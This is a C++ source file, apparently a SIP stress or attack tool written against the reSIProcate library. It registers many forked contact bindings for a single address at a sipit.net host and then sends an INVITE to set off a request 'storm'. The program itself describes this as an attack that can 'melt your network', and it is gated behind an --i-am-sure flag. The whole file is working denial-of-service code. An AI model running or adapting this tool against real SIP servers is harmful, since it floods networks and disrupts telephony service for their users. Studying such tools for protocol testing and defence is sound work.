#include "resip/stack/SipStack.hxx"
#include "resip/stack/NameAddr.hxx"
#include "resip/stack/Helper.hxx"
#include "resip/stack/ExtensionParameter.hxx"

#include "rutil/EsLogger.hxx"

#if defined (HAVE_POPT_H) 
#include <popt.h>
#else
#ifndef WIN32
#warning "will not work very well without libpopt"
#endif
#endif

#include <signal.h>

int main(int argc, char* argv[])
{
#ifndef _WIN32
   if ( signal( SIGPIPE, SIG_IGN) == SIG_ERR)
   {
      std::cerr << "Couldn't install signal handler for SIGPIPE" << std::endl;
      exit(-1);
   }
#endif

   estacado::EsLogger::init("", argc, argv, log4cplus::DEBUG_LOG_LEVEL);

   int areYouSure=0;
   int numAors=70;
   int unReg=0;

#if defined(HAVE_POPT_H)
   struct poptOption table[] = {
      {"i-am-sure",          0 , POPT_ARG_NONE,   &areYouSure     ,   0, "Are you absolutely sure you want to do this?", 0},
      {"unregister",          0 , POPT_ARG_NONE,   &unReg     ,   0, "Unregister bindings?", 0},
      {"num-aors",          0 , POPT_ARG_INT | POPT_ARGFLAG_SHOW_DEFAULT,   &numAors     ,   0, "Number of AORs to compromise for the attack.", 0},
      POPT_AUTOHELP
      { NULL, 0, 0, NULL, 0 }
   };
#endif

   poptContext context = poptGetContext(NULL, argc, const_cast<const char**>(argv), table, 0);
   poptGetNextOpt(context);

   if(!areYouSure)
   {
      std::cout << "You did not use the --i-am-sure command-line flag. This "
               "tool is potentially dangerous. If you are not trying to melt "
               "your network, walk away." << std::endl;
      return 1;
   }

   resip::SipStack sender;
   sender.addTransport(resip::TCP, 0);
   sender.run();

   resip::NameAddr me("sip:666@all.mp.sipit.net");
   resip::NameAddr unreg("*");
   for(int i=0; i<numAors; ++i)
   {
      std::auto_ptr<resip::SipMessage> reg(resip::Helper::makeRegister(me, me));
      reg->remove(resip::h_Contacts);
      reg->header(resip::h_Expires).value() = unReg ? 0 : 3600;
      if(unReg)
      {
         reg->header(resip::h_Contacts).push_back(unreg);
      }
      else
      {
         resip::ExtensionParameter p_d("d");
         reg->header(resip::h_Contacts).push_back(me);
         reg->header(resip::h_Contacts).back().uri().param(p_d)=resip::Random::getRandomHex(1);
         if((i%3)==0)
         {
            reg->header(resip::h_Contacts).back().uri().param(resip::p_transport)="UDP";
         }
      }
      sender.send(reg);
      if(i==0)
      {
         // Don't pound the DNS servers.
         usleep(5000000);
      }
   }

   for(int i=0; i<numAors;)
   {
      std::auto_ptr<resip::SipMessage> resp(sender.receive(100));
      if(resp.get())
      {
         ++i;
         std::cout << "*";
      }
   }

   int countdown=30;
   std::cout << "Beginning storm in "<<countdown<<" seconds..." << std::endl;
   for(;countdown!=0;--countdown)
   {
      std::cout << countdown << std::endl;
      usleep(1000000);
   }

   std::auto_ptr<resip::SipMessage> invite(resip::Helper::makeInvite(me, me));
   sender.send(invite);
   usleep(10000000);

   std::cout << "Have a nice day!" << std::endl;

   sender.shutdown();
   sender.join();
   return 0;
}
